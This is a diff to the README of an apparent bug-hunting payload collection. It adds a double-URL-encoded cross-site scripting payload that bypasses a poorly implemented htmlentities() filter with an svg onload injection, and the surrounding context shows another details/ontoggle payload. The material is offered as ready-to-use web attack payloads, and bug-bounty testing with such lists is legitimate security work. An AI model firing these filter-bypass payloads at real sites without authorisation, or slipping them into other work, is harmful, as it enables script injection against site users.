@@ -17,6 +17,11 @@ For this time I will try to fill in the repo with a payload related to Bug Hunti
 x"><--<img src= "><details/open/ontoggle=alert(`mindbl0w@bugcrodninja.com`)>> --!>=
 ```
 ---
+##### XSS Bypass htmlentities() [bad implementation case]
+```html
+%2522%253E%253Csvg%252Fonload%253Dalert%25281%2529%253E
+```
+---
 
 ## Contributing
 Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
